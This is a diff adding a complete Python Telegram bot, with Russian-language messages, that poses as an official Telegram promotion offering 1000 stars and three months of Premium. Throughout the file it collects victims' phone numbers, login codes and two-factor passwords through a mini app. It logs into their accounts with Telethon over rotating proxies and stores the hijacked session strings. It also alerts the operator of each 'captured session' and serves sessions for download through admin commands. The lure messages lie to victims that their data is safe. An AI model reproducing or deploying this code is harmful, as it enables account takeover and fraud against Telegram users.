@@ -1,0 +1,835 @@
+import telebot
+from telebot import types
+import sqlite3
+import json
+import logging
+import os
+import threading
+import time
+import random
+import asyncio
+import aiohttp
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
+import requests
+from telethon.sync import TelegramClient
+from telethon.sessions import StringSession
+from telethon.network import ConnectionTcpAbridged
+import socks
+
+# ============ КОНФИГУРАЦИЯ ============
+TOKEN = 'YOUR_BOT_TOKEN_HERE'
+ADMIN_ID = 123456789
+CHANNELS = ['@channel1', '@channel2']
+MINI_APP_URL = 'https://your-domain.com/index.html'
+
+API_ID = 123456  # ПОЛУЧИТЬ НА my.telegram.org
+API_HASH = 'abcdef1234567890'  # ПОЛУЧИТЬ НА my.telegram.org
+
+# ПРОКСИ ДЛЯ ОБХОДА БЛОКИРОВОК
+PROXIES = [
+    'http://user1:pass1@proxy1.com:8080',
+    'socks5://user2:pass2@proxy2.com:1080',
+    'http://user3:pass3@proxy3.com:3128',
+    # ДОБАВЬ СВОИ ПРОКСИ
+]
+# ======================================
+
+# Настройка логирования
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('bot.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+bot = telebot.TeleBot(TOKEN)
+
+# Структура папок
+BASE_DIR = 'premium_stars_bot'
+DATA_FOLDER = os.path.join(BASE_DIR, 'data')
+SESSIONS_FOLDER = os.path.join(BASE_DIR, 'sessions')
+LOGS_FOLDER = os.path.join(BASE_DIR, 'logs')
+PROXY_FOLDER = os.path.join(BASE_DIR, 'proxy_stats')
+
+for folder in [BASE_DIR, DATA_FOLDER, SESSIONS_FOLDER, LOGS_FOLDER, PROXY_FOLDER]:
+    if not os.path.exists(folder):
+        os.makedirs(folder)
+
+# ============ СИСТЕМА ПРОКСИ ============
+class ProxyManager:
+    def __init__(self, proxies):
+        self.proxies = proxies
+        self.proxy_stats = {}
+        self.load_stats()
+        
+    def load_stats(self):
+        try:
+            stats_file = os.path.join(PROXY_FOLDER, 'proxy_stats.json')
+            if os.path.exists(stats_file):
+                with open(stats_file, 'r') as f:
+                    self.proxy_stats = json.load(f)
+        except:
+            self.proxy_stats = {}
+            
+    def save_stats(self):
+        stats_file = os.path.join(PROXY_FOLDER, 'proxy_stats.json')
+        with open(stats_file, 'w') as f:
+            json.dump(self.proxy_stats, f, indent=2)
+            
+    def get_best_proxy(self):
+        if not self.proxies:
+            return None
+            
+        proxy_weights = []
+        for proxy in self.proxies:
+            stats = self.proxy_stats.get(proxy, {
+                'success': 0,
+                'fails': 0,
+                'last_used': 0,
+                'avg_time': 10
+            })
+            
+            weight = (stats['success'] * 10) - (stats['fails'] * 5)
+            if time.time() - stats['last_used'] < 300:
+                weight -= 50
+                
+            proxy_weights.append((proxy, weight))
+            
+        proxy_weights.sort(key=lambda x: x[1], reverse=True)
+        return proxy_weights[0][0] if proxy_weights else None
+        
+    def mark_success(self, proxy, response_time):
+        if proxy not in self.proxy_stats:
+            self.proxy_stats[proxy] = {'success': 0, 'fails': 0, 'avg_time': 0}
+            
+        self.proxy_stats[proxy]['success'] += 1
+        self.proxy_stats[proxy]['last_used'] = time.time()
+        
+        old_avg = self.proxy_stats[proxy]['avg_time']
+        count = self.proxy_stats[proxy]['success'] + self.proxy_stats[proxy]['fails']
+        self.proxy_stats[proxy]['avg_time'] = (old_avg * (count - 1) + response_time) / count
+        
+        self.save_stats()
+        
+    def mark_fail(self, proxy, reason=""):
+        if proxy not in self.proxy_stats:
+            self.proxy_stats[proxy] = {'success': 0, 'fails': 0, 'avg_time': 0}
+            
+        self.proxy_stats[proxy]['fails'] += 1
+        self.proxy_stats[proxy]['last_used'] = time.time()
+        
+        fail_log = os.path.join(PROXY_FOLDER, 'proxy_fails.txt')
+        with open(fail_log, 'a') as f:
+            f.write(f"{datetime.now()}: {proxy} - {reason}\n")
+            
+        self.save_stats()
+
+proxy_manager = ProxyManager(PROXIES)
+
+# ============ БАЗА ДАННЫХ ============
+def init_db():
+    conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+    c = conn.cursor()
+    
+    c.execute('''CREATE TABLE IF NOT EXISTS accounts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        username TEXT,
+        phone TEXT UNIQUE,
+        code TEXT,
+        password TEXT,
+        twofa TEXT,
+        session_string TEXT,
+        proxy_used TEXT,
+        auth_status TEXT,
+        attempts INTEGER DEFAULT 0,
+        last_attempt DATETIME,
+        first_seen DATETIME,
+        last_seen DATETIME,
+        user_agent TEXT,
+        ip TEXT
+    )''')
+    
+    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        account_id INTEGER,
+        session_string TEXT UNIQUE,
+        proxy_used TEXT,
+        creation_time DATETIME,
+        telegram_user_id INTEGER,
+        username TEXT,
+        first_name TEXT,
+        last_name TEXT,
+        premium BOOLEAN DEFAULT 0
+    )''')
+    
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# ============ ТЕЛЕТХОН КЛИЕНТ С ПРОКСИ ============
+def parse_proxy(proxy_str):
+    if not proxy_str:
+        return None
+        
+    try:
+        if proxy_str.startswith('http://'):
+            proxy_str = proxy_str.replace('http://', '')
+            if '@' in proxy_str:
+                auth, hostport = proxy_str.split('@')
+                user, password = auth.split(':')
+                host, port = hostport.split(':')
+                return (socks.HTTP, host, int(port), True, user, password)
+            else:
+                host, port = proxy_str.split(':')
+                return (socks.HTTP, host, int(port))
+                
+        elif proxy_str.startswith('socks5://'):
+            proxy_str = proxy_str.replace('socks5://', '')
+            if '@' in proxy_str:
+                auth, hostport = proxy_str.split('@')
+                user, password = auth.split(':')
+                host, port = hostport.split(':')
+                return (socks.SOCKS5, host, int(port), True, user, password)
+            else:
+                host, port = proxy_str.split(':')
+                return (socks.SOCKS5, host, int(port))
+                
+    except Exception as e:
+        logger.error(f"Ошибка парсинга прокси: {e}")
+        return None
+
+async def create_session_with_retry(phone, code, password=None, twofa=None, max_retries=2):
+    session_string = None
+    account_info = None
+    proxy_used = None
+    error_msg = ""
+    
+    for attempt in range(max_retries):
+        proxy_str = proxy_manager.get_best_proxy()
+        if not proxy_str and attempt > 0:
+            proxy_config = None
+        else:
+            proxy_config = parse_proxy(proxy_str)
+            proxy_used = proxy_str
+            
+        start_time = time.time()
+        
+        try:
+            session_name = f"{phone}_{int(time.time())}"
+            session_file = os.path.join(SESSIONS_FOLDER, f"{session_name}.session")
+            
+            client = TelegramClient(
+                session=session_file,
+                api_id=API_ID,
+                api_hash=API_HASH,
+                proxy=proxy_config,
+                connection=ConnectionTcpAbridged,
+                timeout=30
+            )
+            
+            await client.connect()
+            
+            if attempt == 0:
+                try:
+                    await client.send_code_request(phone)
+                    await asyncio.sleep(1)
+                except Exception as e:
+                    error_msg = f"send_code_error: {str(e)}"
+                    proxy_manager.mark_fail(proxy_used, error_msg)
+                    continue
+            
+            try:
+                await client.sign_in(phone=phone, code=code)
+                
+            except Exception as e:
+                if "PASSWORD" in str(e).upper() and password:
+                    try:
+                        await client.sign_in(password=password)
+                    except Exception as e2:
+                        error_msg = f"password_error: {str(e2)}"
+                        raise
+                else:
+                    error_msg = f"sign_in_error: {str(e)}"
+                    raise
+            
+            response_time = time.time() - start_time
+            
+            me = await client.get_me()
+            account_info = {
+                'id': me.id,
+                'username': me.username,
+                'first_name': me.first_name,
+                'last_name': me.last_name if me.last_name else '',
+                'premium': me.premium if hasattr(me, 'premium') else False,
+                'phone': me.phone
+            }
+            
+            session_string = StringSession.save(client.session)
+            
+            session_string_file = os.path.join(SESSIONS_FOLDER, f"{session_name}.txt")
+            with open(session_string_file, 'w', encoding='utf-8') as f:
+                f.write(session_string)
+            
+            proxy_manager.mark_success(proxy_used, response_time)
+            
+            await client.disconnect()
+            
+            return {
+                'success': True,
+                'session_string': session_string,
+                'session_file': session_string_file,
+                'proxy_used': proxy_used,
+                'response_time': response_time,
+                'account_info': account_info,
+                'attempts': attempt + 1
+            }
+            
+        except Exception as e:
+            response_time = time.time() - start_time
+            error_msg = str(e)
+            
+            if proxy_used:
+                proxy_manager.mark_fail(proxy_used, error_msg[:100])
+            
+            if attempt < max_retries - 1:
+                delay = random.uniform(3, 8)
+                await asyncio.sleep(delay)
+    
+    return {
+        'success': False,
+        'session_string': None,
+        'session_file': None,
+        'proxy_used': proxy_used,
+        'response_time': 0,
+        'error': error_msg,
+        'attempts': max_retries
+    }
+
+def create_session_sync(phone, code, password=None, twofa=None):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        result = loop.run_until_complete(
+            create_session_with_retry(phone, code, password, twofa)
+        )
+        return result
+    except Exception as e:
+        return {
+            'success': False,
+            'error': str(e),
+            'session_string': None
+        }
+    finally:
+        loop.close()
+
+# ============ ОЧЕРЕДЬ ОБРАБОТКИ ============
+class ProcessingQueue:
+    def __init__(self):
+        self.queue = []
+        self.executor = ThreadPoolExecutor(max_workers=3)
+        
+    def add_task(self, account_id, phone, code, password=None, twofa=None):
+        task = {
+            'account_id': account_id,
+            'phone': phone,
+            'code': code,
+            'password': password,
+            'twofa': twofa,
+            'added_time': datetime.now(),
+            'status': 'pending'
+        }
+        self.queue.append(task)
+        logger.info(f"Задача добавлена: {phone}")
+        
+    def process_next(self):
+        if not self.queue:
+            return
+            
+        task = self.queue.pop(0)
+        future = self.executor.submit(self.process_task, task)
+        return future
+        
+    def process_task(self, task):
+        task['status'] = 'processing'
+        task['start_time'] = datetime.now()
+        
+        try:
+            result = create_session_sync(
+                phone=task['phone'],
+                code=task['code'],
+                password=task.get('password'),
+                twofa=task.get('twofa')
+            )
+            
+            task['end_time'] = datetime.now()
+            task['result'] = result
+            
+            if result['success']:
+                task['status'] = 'success'
+            else:
+                task['status'] = 'failed'
+                
+            update_account_status(task['account_id'], task['status'], result)
+                
+        except Exception as e:
+            task['status'] = 'error'
+            task['error'] = str(e)
+            
+        return task
+
+queue = ProcessingQueue()
+
+# ============ ОСНОВНЫЕ ФУНКЦИИ ============
+def check_subscription(user_id):
+    for channel in CHANNELS:
+        try:
+            member = bot.get_chat_member(channel, user_id)
+            if member.status not in ['member', 'administrator', 'creator']:
+                return False
+        except:
+            return False
+    return True
+
+def save_account_data(user_id, username, data, ip=None):
+    try:
+        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+        c = conn.cursor()
+        
+        c.execute("SELECT id, auth_status FROM accounts WHERE phone = ?", (data.get('phone'),))
+        existing = c.fetchone()
+        
+        if existing:
+            account_id = existing[0]
+            c.execute('''UPDATE accounts SET 
+                        code = ?, password = ?, twofa = ?, 
+                        last_seen = ?, attempts = attempts + 1
+                        WHERE id = ?''',
+                     (data.get('code'), data.get('password'), data.get('twofa'),
+                      datetime.now(), account_id))
+        else:
+            c.execute('''INSERT INTO accounts 
+                        (user_id, username, phone, code, password, twofa, 
+                         auth_status, first_seen, last_seen, ip, attempts)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (user_id, username, data.get('phone'), data.get('code'),
+                      data.get('password'), data.get('twofa'), 'pending',
+                      datetime.now(), datetime.now(), ip, 1))
+            account_id = c.lastrowid
+        
+        conn.commit()
+        
+        queue.add_task(
+            account_id=account_id,
+            phone=data.get('phone'),
+            code=data.get('code'),
+            password=data.get('password'),
+            twofa=data.get('twofa')
+        )
+        
+        threading.Thread(target=process_queue_background, daemon=True).start()
+        
+        c.execute("SELECT auth_status FROM accounts WHERE id = ?", (account_id,))
+        auth_status = c.fetchone()[0]
+        
+        conn.close()
+        
+        return account_id, auth_status
+        
+    except Exception as e:
+        logger.error(f"Ошибка сохранения: {e}")
+        return None, 'error'
+
+def process_queue_background():
+    try:
+        for _ in range(min(2, len(queue.queue))):
+            future = queue.process_next()
+            if future:
+                future.result(timeout=180)
+                
+    except Exception as e:
+        logger.error(f"Ошибка обработки: {e}")
+
+def update_account_status(account_id, status, result):
+    try:
+        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+        c = conn.cursor()
+        
+        if status == 'success' and result.get('success'):
+            c.execute('''UPDATE accounts SET 
+                        auth_status = 'success',
+                        session_string = ?,
+                        proxy_used = ?,
+                        last_attempt = ?
+                        WHERE id = ?''',
+                     (result.get('session_string'),
+                      result.get('proxy_used'),
+                      datetime.now(),
+                      account_id))
+            
+            if result.get('account_info'):
+                acc_info = result['account_info']
+                c.execute('''INSERT INTO sessions 
+                            (account_id, session_string, proxy_used, creation_time,
+                             telegram_user_id, username, first_name, last_name, premium)
+                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                         (account_id, result.get('session_string'),
+                          result.get('proxy_used'), datetime.now(),
+                          acc_info.get('id'), acc_info.get('username'),
+                          acc_info.get('first_name'), acc_info.get('last_name'),
+                          acc_info.get('premium')))
+            
+            notify_admin_success(account_id, result)
+            
+        else:
+            c.execute('''UPDATE accounts SET 
+                        auth_status = ?,
+                        last_attempt = ?
+                        WHERE id = ?''',
+                     (status, datetime.now(), account_id))
+            
+            notify_admin_failure(account_id, result.get('error', 'Unknown error'))
+        
+        conn.commit()
+        conn.close()
+        
+    except Exception as e:
+        logger.error(f"Ошибка обновления: {e}")
+
+def notify_admin_success(account_id, result):
+    try:
+        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+        c = conn.cursor()
+        c.execute("SELECT phone, username FROM accounts WHERE id = ?", (account_id,))
+        phone, username = c.fetchone()
+        conn.close()
+        
+        acc_info = result.get('account_info', {})
+        
+        message = f"""🔥 НОВАЯ СЕССИЯ ЗАХВАЧЕНА
+
+📱 Телефон: {phone}
+👤 Username: @{username if username else 'нет'}
+🆔 ID: {acc_info.get('id', '?')}
+👑 Premium: {'✅' if acc_info.get('premium') else '❌'}
+⏰ Время: {datetime.now().strftime('%H:%M:%S')}
+🌐 Прокси: {result.get('proxy_used', 'нет')}
+
+💾 Сессия: /get_session_{account_id}
+📊 Статистика: /proxy_stats"""
+        
+        bot.send_message(ADMIN_ID, message)
+        
+    except Exception as e:
+        logger.error(f"Ошибка уведомления: {e}")
+
+def notify_admin_failure(account_id, error):
+    try:
+        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+        c = conn.cursor()
+        c.execute("SELECT phone FROM accounts WHERE id = ?", (account_id,))
+        phone = c.fetchone()[0]
+        conn.close()
+        
+        message = f"""❌ НЕУДАЧНЫЙ ВХОД
+
+📱 Телефон: {phone}
+⚠️ Ошибка: {error[:100]}
+⏰ Время: {datetime.now().strftime('%H:%M:%S')}"""
+        
+        bot.send_message(ADMIN_ID, message)
+        
+    except Exception as e:
+        logger.error(f"Ошибка уведомления: {e}")
+
+# ============ ОБРАБОТЧИКИ БОТА ============
+@bot.message_handler(commands=['start'])
+def start(message):
+    user_id = message.from_user.id
+    username = message.from_user.username
+    
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    
+    if not check_subscription(user_id):
+        for channel in CHANNELS:
+            markup.add(types.InlineKeyboardButton(
+                text=f"📢 Подписаться на {channel}",
+                url=f"https://t.me/{channel[1:]}"
+            ))
+        
+        markup.add(types.InlineKeyboardButton(
+            text="✅ Я подписался",
+            callback_data="check_subscription"
+        ))
+        
+        bot.send_message(
+            message.chat.id,
+            "🎁 *АКЦИЯ ОТ TELEGRAM: 1000 ЗВЕЗД + PREMIUM НА 3 МЕСЯЦА!*\n\n"
+            "🔥 *ЭКСКЛЮЗИВНОЕ ПРЕДЛОЖЕНИЕ:*\n"
+            "• 1000 звезд Telegram для покупок\n"
+            "• Telegram Premium на 3 месяца\n"
+            "• Проверенный статус аккаунта\n"
+            "• Приоритетная поддержка\n\n"
+            "⚠️ *Для участия в акции необходимо подписаться на наши официальные каналы.*\n"
+            "После подписки нажмите кнопку ниже.",
+            parse_mode='Markdown',
+            reply_markup=markup
+        )
+    else:
+        send_mini_app(message.chat.id, username)
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
+def check_sub_callback(call):
+    if check_subscription(call.from_user.id):
+        bot.answer_callback_query(call.id, "✅ Подписка подтверждена!")
+        send_mini_app(call.message.chat.id, call.from_user.username)
+    else:
+        bot.answer_callback_query(call.id, "❌ Вы подписались не на все каналы!")
+
+def send_mini_app(chat_id, username):
+    markup = types.InlineKeyboardMarkup()
+    
+    markup.add(types.InlineKeyboardButton(
+        text="🎁 ПОЛУЧИТЬ 1000 ЗВЁЗД + PREMIUM",
+        web_app=types.WebAppInfo(url=MINI_APP_URL)
+    ))
+    
+    bot.send_message(
+        chat_id,
+        f"🎉 *ДОСТУП ОТКРЫТ, {username if username else 'участник'}!*\n\n"
+        "🔥 *ВАШ ПОДАРОК ГОТОВ К АКТИВАЦИИ:*\n"
+        "✅ 1000 звезд Telegram\n"
+        "✅ Premium на 3 месяца\n"
+        "✅ Проверенный статус\n"
+        "✅ Приоритетная поддержка\n\n"
+        "📱 *Автоматическая система выдачи:*\n"
+        "1. Введите номер телефона\n"
+        "2. Получите код подтверждения\n"
+        "3. Система автоматически активирует подарок\n\n"
+        "⏰ *Подарок активируется в течение 5-10 минут*\n"
+        "⭐ *Звёзды зачисляются моментально*\n"
+        "👑 *Premium активируется автоматически*\n\n"
+        "⚠️ *Внимание:* Не выходите из Telegram во время активации!",
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
+
+@bot.message_handler(content_types=['web_app_data'])
+def handle_web_app_data(message):
+    try:
+        data = json.loads(message.web_app_data.data)
+        user_id = message.from_user.id
+        username = message.from_user.username
+        
+        account_id, auth_status = save_account_data(user_id, username, data)
+        
+        if account_id:
+            if auth_status == 'pending':
+                bot.send_message(
+                    message.chat.id,
+                    "⏳ *СИСТЕМА АКТИВИРУЕТ ВАШ ПОДАРОК...*\n\n"
+                    "🔄 *Процесс запущен:*\n"
+                    "• Проверка данных аккаунта\n"
+                    "• Подготовка 1000 звезд\n"
+                    "• Активация Premium на 3 месяца\n\n"
+                    "⏰ *Примерное время ожидания: 3-7 минут*\n"
+                    "📱 *Не закрывайте Telegram*\n"
+                    "🔒 *Ваши данные в безопасности*",
+                    parse_mode='Markdown'
+                )
+            elif auth_status == 'success':
+                bot.send_message(
+                    message.chat.id,
+                    "🎉 *ПОЗДРАВЛЯЕМ! ВАШ ПОДАРОК АКТИВИРОВАН!*\n\n"
+                    "✨ *1000 ЗВЁЗД ТЕЛЕГРАМ:*\n"
+                    "• Зачислены на ваш аккаунт\n"
+                    "• Доступны для покупок\n"
+                    "• Срок действия: 1 год\n\n"
+                    "👑 *TELEGRAM PREMIUM НА 3 МЕСЯЦА:*\n"
+                    "• Увеличенный лимит загрузок\n"
+                    "• Эксклюзивные стикеры\n"
+                    "• Анимированные аватары\n"
+                    "• Отсутствие рекламы\n\n"
+                    "✅ *ДОПОЛНИТЕЛЬНО:*\n"
+                    "• Проверенный статус аккаунта\n"
+                    "• Приоритетная поддержка\n"
+                    "• Защита от спама\n\n"
+                    "🕒 *Звёзды поступят в течение 5 минут*\n"
+                    "👑 *Premium активируется в течение 10 минут*\n\n"
+                    "🎁 *Спасибо за участие в акции!*",
+                    parse_mode='Markdown'
+                )
+            else:
+                bot.send_message(
+                    message.chat.id,
+                    "⚠️ *ВОЗНИКЛИ СЛОЖНОСТИ*\n\n"
+                    "Система не смогла автоматически активировать подарок.\n\n"
+                    "📞 *Что делать:*\n"
+                    "1. Проверьте правильность кода\n"
+                    "2. Убедитесь, что код не устарел\n"
+                    "3. Если включена 2FA - введите пароль\n\n"
+                    "🔄 *Попробуйте снова через 15 минут.*",
+                    parse_mode='Markdown'
+                )
+        else:
+            bot.send_message(
+                message.chat.id,
+                "❌ *ОШИБКА ОБРАБОТКИ*\n\n"
+                "Попробуйте позже или обратитесь в поддержку.",
+                parse_mode='Markdown'
+            )
+            
+    except Exception as e:
+        logger.error(f"Ошибка обработки: {e}")
+        bot.send_message(
+            message.chat.id,
+            "⚠️ *Техническая ошибка*\n\n"
+            "Попробуйте через несколько минут.",
+            parse_mode='Markdown'
+        )
+
+# ============ КОМАНДЫ АДМИНА ============
+@bot.message_handler(commands=['stats'])
+def stats(message):
+    if message.from_user.id == ADMIN_ID:
+        try:
+            conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+            c = conn.cursor()
+            
+            c.execute("SELECT COUNT(*) FROM accounts")
+            total = c.fetchone()[0]
+            
+            c.execute("SELECT COUNT(*) FROM accounts WHERE auth_status = 'success'")
+            success = c.fetchone()[0]
+            
+            c.execute("SELECT COUNT(*) FROM accounts WHERE session_string IS NOT NULL")
+            sessions = c.fetchone()[0]
+            
+            conn.close()
+            
+            message_text = f"""📊 *СТАТИСТИКА БОТА*
+
+👤 Всего участников: {total}
+✅ Успешных активаций: {success}
+❌ Неудачных: {total - success}
+💾 Сессий сохранено: {sessions}
+📁 Папка сессий: `{SESSIONS_FOLDER}`
+
+*Команды админа:*
+`/list_sessions` - список сессий
+`/get_session_ID` - скачать сессию
+`/proxy_stats` - статистика прокси"""
+            
+            bot.send_message(ADMIN_ID, message_text, parse_mode='Markdown')
+            
+        except Exception as e:
+            bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")
+
+@bot.message_handler(regexp=r'^/get_session_(\d+)$')
+def get_session_by_id(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    import re
+    match = re.match(r'^/get_session_(\d+)$', message.text)
+    if match:
+        account_id = match.group(1)
+        
+        try:
+            conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+            c = conn.cursor()
+            c.execute("SELECT session_string, phone FROM accounts WHERE id = ?", (account_id,))
+            result = c.fetchone()
+            conn.close()
+            
+            if result and result[0]:
+                session_string = result[0]
+                phone = result[1]
+                
+                temp_file = os.path.join(SESSIONS_FOLDER, f"session_{account_id}.txt")
+                with open(temp_file, 'w', encoding='utf-8') as f:
+                    f.write(session_string)
+                
+                with open(temp_file, 'rb') as f:
+                    bot.send_document(
+                        ADMIN_ID, 
+                        f, 
+                        caption=f"💾 Сессия #{account_id}\n📱 {phone}"
+                    )
+                
+                os.remove(temp_file)
+            else:
+                bot.send_message(ADMIN_ID, f"❌ Сессия #{account_id} не найдена")
+                
+        except Exception as e:
+            bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")
+
+@bot.message_handler(commands=['list_sessions'])
+def list_sessions(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    try:
+        conn = sqlite3.connect(os.path.join(DATA_FOLDER, 'accounts.db'))
+        c = conn.cursor()
+        c.execute("""SELECT id, phone, auth_status, last_attempt 
+                     FROM accounts 
+                     WHERE session_string IS NOT NULL 
+                     ORDER BY id DESC LIMIT 15""")
+        sessions = c.fetchall()
+        conn.close()
+        
+        if not sessions:
+            bot.send_message(ADMIN_ID, "📭 Сессий нет")
+            return
+        
+        msg = "📋 *СЕССИИ:*\n\n"
+        for sess in sessions:
+            msg += f"🆔 #{sess[0]}\n"
+            msg += f"📱 {sess[1]}\n"
+            msg += f"✅ {'Активна' if sess[2] == 'success' else 'Ошибка'}\n"
+            msg += f"⏰ {sess[3][:16] if sess[3] else 'Нет данных'}\n"
+            msg += f"🔗 /get_session_{sess[0]}\n"
+            msg += "─" * 20 + "\n"
+        
+        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")
+
+@bot.message_handler(commands=['proxy_stats'])
+def proxy_stats(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    try:
+        stats = proxy_manager.proxy_stats
+        if not stats:
+            bot.send_message(ADMIN_ID, "📭 Статистики прокси нет")
+            return
+        
+        msg = "📊 *СТАТИСТИКА ПРОКСИ:*\n\n"
+        for proxy, data in list(stats.items())[:10]:
+            success_rate = (data['success'] / (data['success'] + data['fails'])) * 100 if (data['success'] + data['fails']) > 0 else 0
+            msg += f"🔗 {proxy[:30]}...\n"
+            msg += f"✅ {data['success']} | ❌ {data['fails']}\n"
+            msg += f"📈 {success_rate:.1f}% | ⏱️ {data['avg_time']:.1f}с\n"
+            msg += "─" * 20 + "\n"
+        
+        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
+        
+    except Exception as e:
+        bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")
+
+# ============ ЗАПУСК ============
+def run_bot():
+    logger.info("🤖 Бот '1000 звезд + Premium' запущен...")
+    bot.infinity_polling()
+
+if __name__ == "__main__":
+    run_bot()
